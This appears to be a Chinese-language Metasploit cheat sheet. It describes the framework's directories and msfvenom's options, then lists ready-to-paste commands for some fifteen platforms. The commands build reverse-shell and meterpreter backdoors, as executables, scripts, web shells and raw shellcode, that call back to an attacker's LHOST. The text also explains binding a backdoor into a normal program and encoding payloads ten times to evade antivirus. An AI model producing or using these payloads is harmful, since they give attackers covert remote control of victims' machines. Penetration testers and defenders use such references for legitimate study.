# 查看模块
1. 在kali终端中输入:
```markdown
cd /usr/share/metasploit-framework
```

2. 查看
```markdown
ls
```
**注意:可能无法一次cd成功, 可以一步步分开cd**

# 认识模块
| # 模块
 | # 功能
 |
| --- | --- |
| modules | 目录里面存放渗透使用的 辅助模块 编码模块 利用模块 攻击载荷 后渗透模块 |
| plugins | 这个模块需要用load加载，主要提供数据库连接插件 和 各种要用到的插件。
 |
| tools | 包含一些有用的脚本和零散的工具。
 |
| scripts | 目录里面存放都是meterpreter利用的脚本。
 |
| db | 数据放在这个目录里
 |
| data | 存放使用到的文件，比如密码字典、meterpreter、passivex、vnc、dlls等工具和一些用户接口代码，msfweb和一些其他模块用到的数据文件
 |
| lib | 库文件都保存在这个目录里 |


# msf常用参数
## 简介

Kali中的 msfvenom 取代了msfpayload和msfencode，常用于生成后门木马
msfpayload是MSF攻击荷载生成器，用于生成shellcode和可执行代码。
msfencode是MSF编码器。

---

一 、msfvenom 常用参数

-l
列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all

-p
指定需要使用的payload(攻击荷载)。

-f
指定输出格式
Executable formats:Asp、aspx、aspx-exe、axis2、dll、elf、elf-so、exe、exe-only、exe-service、exe-smallhta-psh、jar、jsp、loop-vbs、macho、msi、msi-nouac、osx-app、psh、psh-cmd、psh-net、psh-reflection、python-reflection、vba、vba-exe、vba-psh、vbs、war；

Transform formats:base32、base64、bash、c、csharp、dw、dword、hex、java、js_be、js_le、num、perl、pl、powershell、ps1、py、python、raw、rb、ruby、sh、vbapplication、vbscript；

-e
指定需要使用的encoder（编码器）编码免杀。

-a
指定payload的目标架构

选择架构平台:x86 | x64 | x86_64
Platforms:windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe

-o
保存payload文件输出。

-b
设定规避字符集，比如: '\x00\xff'避免使用的字符

-n
为payload预先指定一个NOP滑动长度

-s
设定有效攻击荷载的最大长度生成payload的最大长度，就是文件大小。

-i
指定payload的编码次数

-c
指定一个附加的win32 shellcode文件

-x
指定一个自定义的可执行文件作为模板
例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面。

-k
保护模板程序的动作，注入的payload作为一个新的进程运行
例如：原先有个正常文件normal.exe 可以通过这个选项把后门捆绑到这个程序上面。

-v
指定一个自定义的变量，以确定输出格式

# msfvenom在各个平台生成payload的命令
> **注意:**
> 1. **使用时, 只需要修改 LHOST的ip和LPORT的端口就行.**
> 2. **还有 -i , 一般指定编码10次**
> 3. **复制的时候不要有空格, 否则会报错**
> 4. **下面有几条没有使用 -o 的就直接出处到终端了, 那不是报错**
> 




## Windows
```markdown
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.3.33 LPORT=4444 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 10 -f exe -o payload.exe
```

---


## Mac
```markdown
msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.3.33 LPORT=4444 -f macho -o payload.macho
```

---


## Android
```markdown
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -o payload.apk
```

---


## Powershell
```markdown
msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.1.1 LPORT=8888 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1
```

---


## Linux
```markdown
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f elf -o payload.elf
```

---

## php

```markdown
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.1 LPORT=8888 -f raw > shell.php
```

---


## aspx
```markdown
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8888 -f aspx -o payload.aspx
```

---


## JSP
msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.jsp

---

## war

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw - o payload.war

---


## nodejs
msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.js

---


## python
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.py

---


## perl
msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.pl

---


## ruby
msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.rb

---


## lua
msfvenom -p cmd/unix/reverse_lua LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.lua

---


## windows shellcode
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c

---


## linux shellcode
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c

---


## mac shellcode
msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c







